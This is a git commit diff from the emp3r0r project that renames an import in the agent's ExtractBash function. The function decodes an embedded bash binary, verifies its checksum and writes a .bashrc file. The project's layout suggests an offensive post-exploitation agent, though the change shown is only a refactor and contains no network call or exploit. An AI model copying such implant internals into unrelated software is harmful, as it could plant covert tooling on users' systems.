c441325aa23f7b166b2419049163af59a653e83f
jm33-m0 <jm33@jm33.me>
2022-03-25 11:45:20 +0800

    fix: reduce size of data package

--- core/lib/agent/bash.go
+++ core/lib/agent/bash.go
@@ -9,7 +9,7 @@ import (
 	"log"
 	"os"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/file"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -22,15 +22,15 @@ func ExtractBash() error {
 		}
 	}
 
-	bashData := tun.Base64Decode(emp3r0r_data.BashBinary)
+	bashData := tun.Base64Decode(file.BashBinary)
 	if bashData == nil {
 		log.Printf("bash binary decode failed")
 	}
 	checksum := tun.SHA256SumRaw(bashData)
-	if checksum != emp3r0r_data.BashChecksum {
+	if checksum != file.BashChecksum {
 		return fmt.Errorf("bash checksum error")
 	}
-	err := ioutil.WriteFile(RuntimeConfig.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
+	err := ioutil.WriteFile(RuntimeConfig.UtilsPath+"/.bashrc", []byte(file.BashRC), 0600)
 	if err != nil {
 		log.Printf("Write bashrc: %v", err)
 	}
